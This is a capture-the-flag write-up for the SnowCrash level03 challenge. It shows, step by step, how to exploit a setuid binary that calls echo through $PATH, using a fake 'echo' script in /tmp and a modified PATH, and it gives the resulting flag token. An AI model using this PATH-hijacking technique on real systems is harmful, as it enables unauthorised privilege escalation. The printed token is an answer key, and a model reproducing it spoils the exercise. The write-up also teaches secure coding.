Level03 - PATH Environment Variable Exploitation
Overview
This level demonstrates a PATH hijacking vulnerability where an executable calls a command without using an absolute path, allowing us to substitute our own malicious version.
Solution Steps
Step 1: Download the Executable
Retrieve the level03 binary from the remote server:

```sh
scp -P 4242 level03@ip_address:/home/user/level03/level03 ./level03
```

Step 2: Analyze the Binary
Open the file in any online decompiler (such as Dogbolt or Decompiler Explorer).
Key finding:

```c
system("/usr/bin/env echo Exploit me");
```

This code uses /usr/bin/env to locate the echo command from the $PATH environment variable instead of using an absolute path like /bin/echo. This creates a vulnerability we can exploit.
Step 3: Create a Malicious echo Command
Since the program searches for echo in $PATH, we can create our own version that executes getflag:

```sh
level03@SnowCrash:~$ cd /tmp
level03@SnowCrash:/tmp$ echo '/bin/getflag' > echo
level03@SnowCrash:/tmp$ chmod 777 echo
```

What this does:

Creates a file named echo containing the command /bin/getflag
Makes it executable with full permissions

Step 4: Hijack the PATH
Prepend /tmp to the $PATH environment variable so our malicious echo is found first:

```sh
level03@SnowCrash:/tmp$ export PATH=/tmp:$PATH
```

Step 5: Execute and Get the Flag
Run the level03 binary. It will now execute our fake echo (which runs getflag):

```sh
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## Vulnerability Explanation

**The Problem:**
- The binary runs with elevated privileges (setuid)
- It calls `echo` through `/usr/bin/env` which searches `$PATH`
- We can control `$PATH` and inject our own executable

**The Exploit:**
1. Create a malicious binary named `echo` in a writable directory (`/tmp`)
2. Modify `$PATH` to prioritize our directory
3. When the program calls `echo`, it executes our version instead

## Security Lesson

**Secure coding practices:**
- ✗ **Bad:** `system("/usr/bin/env echo ...")`
- ✓ **Good:** `system("/bin/echo ...")` (use absolute paths)
- ✓ **Better:** Avoid `system()` calls entirely when possible

```
## Token
qi0maab88jeaj46qoumi7maus